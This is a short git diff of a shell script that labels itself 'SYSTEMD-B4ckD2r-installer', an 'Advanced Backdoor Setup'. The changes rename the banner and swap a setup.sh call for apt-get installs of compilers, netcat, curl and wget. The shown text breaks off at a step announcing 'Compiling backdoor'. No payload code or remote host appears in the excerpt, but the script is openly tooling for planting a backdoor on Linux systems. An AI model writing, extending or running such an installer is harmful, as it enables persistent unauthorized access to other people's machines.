@@ -23,15 +23,17 @@ SUCCESS="[+]"
 ROCKET="[+]"
 
 echo -e "${PURPLE}==========================================${RESET}"
-echo -e "${PINK}${BOLD}     SYSTEMD-LINUX INSTALLER v2.0${RESET}"
-echo -e "${CYAN}${BOLD}   Advanced Backdoor Setup - Neon Edition${RESET}"
+echo -e "${PINK}${BOLD}     SYSTEMD-B4ckD2r-installer v1.0${RESET}"
+echo -e "${CYAN}${BOLD}   Advanced Backdoor Setup -${RESET}"
 echo -e "${PURPLE}==========================================${RESET}"
 echo ""
 
-echo -e "${YELLOW}${BOLD}[${GEAR}] Step 1: Installing required packages...${RESET}"
-chmod +x setup.sh 2>/dev/null
-./setup.sh 2>/dev/null
-echo -e "${GREEN}${BOLD}${CHECK} Packages installed successfully!${RESET}"
+echo -e "${YELLOW}${BOLD}[${GEAR}] Updating and installing required packages...${RESET}"
+apt-get update
+apt-get install -y gcc make build-essential
+apt-get install -y netcat-openbsd
+apt-get install -y curl wget
+echo -e "${GREEN}${BOLD}${CHECK} Updated and packages installed successfully!${RESET}"
 echo ""
 
 echo -e "${YELLOW}${BOLD}[${FOLDER}] Step 2: Compiling backdoor...${RESET}"
